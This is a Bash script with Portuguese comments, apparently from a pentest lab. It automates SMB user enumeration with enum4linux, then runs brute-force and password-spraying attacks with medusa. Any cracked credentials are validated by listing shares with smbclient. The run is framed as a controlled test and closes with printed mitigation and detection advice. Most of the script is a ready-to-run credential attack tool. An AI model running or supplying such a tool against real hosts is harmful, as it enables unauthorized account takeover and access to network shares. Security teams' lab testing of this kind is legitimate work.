#!/bin/bash

##############################################################################
# Script: Test SMB Brute Force Attack
# Descrição: Automatiza teste de força bruta e password spraying em SMB
# Uso: ./test-smb.sh <IP_ALVO> [MODE]
#      MODE: brute (padrão) ou spray
##############################################################################

# Cores para output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Variáveis
TARGET_IP="${1:-192.168.56.3}"
MODE="${2:-brute}"
USER_WORDLIST="../wordlists/smb-users.txt"
PASS_WORDLIST="../wordlists/smb-passwords.txt"
LOG_DIR="../logs"
LOG_FILE="$LOG_DIR/smb-test-$(date +%Y%m%d-%H%M%S).log"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════════════════════════╗"
echo "║       SMB BRUTE FORCE TEST - AMBIENTE CONTROLADO           ║"
echo "╚════════════════════════════════════════════════════════════╝"
echo -e "${NC}"

# Verificações iniciais
echo -e "${YELLOW}[*] Verificando pré-requisitos...${NC}"

mkdir -p "$LOG_DIR"

# Verificar ferramentas
TOOLS=("medusa" "smbclient" "enum4linux" "nmap")
for tool in "${TOOLS[@]}"; do
    if ! command -v "$tool" &> /dev/null; then
        echo -e "${RED}[✗] $tool não encontrado!${NC}"
        echo "    Instale com: sudo apt install $tool"
        exit 1
    fi
done
echo -e "${GREEN}[✓] Todas as ferramentas instaladas${NC}"

# Verificar wordlists
if [ ! -f "$USER_WORDLIST" ]; then
    echo -e "${RED}[✗] Lista de usuários não encontrada: $USER_WORDLIST${NC}"
    exit 1
fi
if [ ! -f "$PASS_WORDLIST" ]; then
    echo -e "${RED}[✗] Lista de senhas não encontrada: $PASS_WORDLIST${NC}"
    exit 1
fi

USER_COUNT=$(wc -l < "$USER_WORDLIST")
PASS_COUNT=$(wc -l < "$PASS_WORDLIST")
echo -e "${GREEN}[✓] Wordlists encontradas (Usuários: $USER_COUNT, Senhas: $PASS_COUNT)${NC}"

# Verificar conectividade
echo -e "\n${YELLOW}[*] Verificando conectividade...${NC}"
if ! ping -c 2 -W 2 "$TARGET_IP" &> /dev/null; then
    echo -e "${RED}[✗] Não foi possível alcançar $TARGET_IP${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Alvo acessível${NC}"

# Verificar portas SMB
echo -e "\n${YELLOW}[*] Verificando serviços SMB...${NC}"
SMB_PORTS=$(nmap -p 139,445 "$TARGET_IP" 2>/dev/null | grep "open" | awk '{print $1}')

if [ -z "$SMB_PORTS" ]; then
    echo -e "${RED}[✗] Portas SMB (139/445) não estão abertas${NC}"
    exit 1
fi
echo -e "${GREEN}[✓] Portas SMB abertas: $SMB_PORTS${NC}"

# Enumeração de usuários
echo -e "\n${YELLOW}[*] Enumerando usuários do sistema...${NC}"
echo -e "${BLUE}    (Isso pode demorar um pouco...)${NC}"

ENUM_USERS=$(enum4linux -U "$TARGET_IP" 2>/dev/null | grep "user:" | awk '{print $NF}' | sed 's/\[//g;s/\]//g')

if [ -n "$ENUM_USERS" ]; then
    echo -e "${GREEN}[✓] Usuários encontrados via enum4linux:${NC}"
    echo "$ENUM_USERS" | while read -r user; do
        echo -e "    - $user"
    done
    
    # Salvar usuários enumerados
    ENUM_FILE="$LOG_DIR/enumerated-users-$(date +%Y%m%d-%H%M%S).txt"
    echo "$ENUM_USERS" > "$ENUM_FILE"
    echo -e "${BLUE}[*] Usuários salvos em: $ENUM_FILE${NC}"
else
    echo -e "${YELLOW}[!] Nenhum usuário enumerado (usando wordlist padrão)${NC}"
fi

# Parâmetros do teste
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${YELLOW}Parâmetros do Teste:${NC}"
echo -e "  Alvo.........: ${GREEN}$TARGET_IP${NC}"
echo -e "  Modo.........: ${GREEN}$MODE${NC}"
echo -e "  Usuários.....: ${GREEN}$USER_COUNT${NC}"
echo -e "  Senhas.......: ${GREEN}$PASS_COUNT${NC}"

if [ "$MODE" == "spray" ]; then
    echo -e "  Estratégia...: ${YELLOW}Password Spraying (mesma senha, múltiplos usuários)${NC}"
else
    echo -e "  Estratégia...: ${YELLOW}Brute Force (todas combinações)${NC}"
fi

echo -e "  Log..........: ${GREEN}$LOG_FILE${NC}"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

read -p "Deseja continuar? (s/N): " -n 1 -r
echo
if [[ ! $REPLY =~ ^[Ss]$ ]]; then
    echo -e "${RED}[!] Teste cancelado${NC}"
    exit 0
fi

START_TIME=$(date +%s)

# Executar ataque baseado no modo
if [ "$MODE" == "spray" ]; then
    # Password Spraying
    echo -e "\n${BLUE}[*] Iniciando Password Spraying...${NC}"
    echo -e "${YELLOW}    Testando senhas comuns em múltiplos usuários${NC}\n"
    
    while IFS= read -r password; do
        echo -e "${BLUE}[*] Testando senha: $password${NC}"
        medusa -H "$USER_WORDLIST" -p "$password" -M smbnt -h "$TARGET_IP" -t 2 2>&1 | tee -a "$LOG_FILE"
        
        # Pequeno delay para evitar bloqueio
        sleep 2
    done < "$PASS_WORDLIST"
    
else
    # Brute Force tradicional
    echo -e "\n${BLUE}[*] Iniciando Brute Force tradicional...${NC}"
    echo -e "${YELLOW}    Testando todas as combinações usuário/senha${NC}\n"
    
    medusa -H "$USER_WORDLIST" -P "$PASS_WORDLIST" -M smbnt -h "$TARGET_IP" -t 4 -f 2>&1 | tee "$LOG_FILE"
fi

END_TIME=$(date +%s)
DURATION=$((END_TIME - START_TIME))

# Analisar resultados
echo -e "\n${YELLOW}════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE}[*] Análise de Resultados:${NC}"

FOUND_CREDS=$(grep "ACCOUNT FOUND" "$LOG_FILE")

if [ -n "$FOUND_CREDS" ]; then
    echo -e "${GREEN}[✓] CREDENCIAIS ENCONTRADAS!${NC}\n"
    
    echo "$FOUND_CREDS" | while IFS= read -r line; do
        USER=$(echo "$line" | grep -oP 'User: \K\w+')
        PASS=$(echo "$line" | grep -oP 'Password: \K\w+')
        echo -e "    ${GREEN}Usuário: $USER | Senha: $PASS${NC}"
    done
    
    echo -e "\n${YELLOW}[*] Validando acesso SMB...${NC}"
    
    # Pegar primeira credencial encontrada para validar
    FIRST_USER=$(echo "$FOUND_CREDS" | head -1 | grep -oP 'User: \K\w+')
    FIRST_PASS=$(echo "$FOUND_CREDS" | head -1 | grep -oP 'Password: \K\w+')
    
    # Listar compartilhamentos
    echo -e "${BLUE}[*] Listando compartilhamentos SMB...${NC}"
    smbclient -L "//$TARGET_IP" -U "$FIRST_USER%$FIRST_PASS" 2>/dev/null | tee -a "$LOG_FILE"
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[✓] Acesso SMB validado com sucesso!${NC}"
    else
        echo -e "${RED}[!] Erro ao validar acesso SMB${NC}"
    fi
    
else
    echo -e "${RED}[✗] Nenhuma credencial encontrada${NC}"
fi

echo -e "\n    Tempo total.: ${DURATION}s"
echo -e "${YELLOW}════════════════════════════════════════════════════════════${NC}"

# Estatísticas
echo -e "\n${BLUE}[*] Estatísticas do Teste:${NC}"
TOTAL_ATTEMPTS=$((USER_COUNT * PASS_COUNT))

if [ "$MODE" == "spray" ]; then
    echo -e "    Modo: Password Spraying"
    echo -e "    Tentativas totais: $PASS_COUNT senhas × $USER_COUNT usuários = $TOTAL_ATTEMPTS"
else
    echo -e "    Modo: Brute Force"
    echo -e "    Combinações testadas: $TOTAL_ATTEMPTS"
fi

if [ $DURATION -gt 0 ]; then
    echo -e "    Taxa média: $((TOTAL_ATTEMPTS / DURATION)) tentativas/segundo"
fi

# Recomendações
echo -e "\n${BLUE}[*] Recomendações de Mitigação para SMB:${NC}"
echo -e "    1. Desabilitar SMBv1 (vulnerável a WannaCry e outros)"
echo -e "    2. Implementar bloqueio de conta após 5 tentativas falhas"
echo -e "    3. Usar senhas fortes para todas as contas"
echo -e "    4. Limitar acesso SMB por firewall (apenas IPs autorizados)"
echo -e "    5. Monitorar logs: Event ID 4625 (Windows) ou /var/log/samba/"
echo -e "    6. Usar autenticação Kerberos ao invés de NTLM"
echo -e "    7. Implementar Network Access Control (NAC)"
echo -e "    8. Segregar rede em VLANs separadas"

# Comandos úteis
echo -e "\n${BLUE}[*] Comandos Úteis para Análise:${NC}"
echo -e "    # Ver tentativas de login no Windows:"
echo -e "    Get-EventLog -LogName Security -InstanceId 4625"
echo -e ""
echo -e "    # Ver logs do Samba (Linux):"
echo -e "    tail -f /var/log/samba/log.smbd"
echo -e ""
echo -e "    # Bloquear IP com iptables:"
echo -e "    sudo iptables -A INPUT -s <IP_ATACANTE> -j DROP"

echo -e "\n${GREEN}[✓] Teste concluído! Log salvo em: $LOG_FILE${NC}\n"
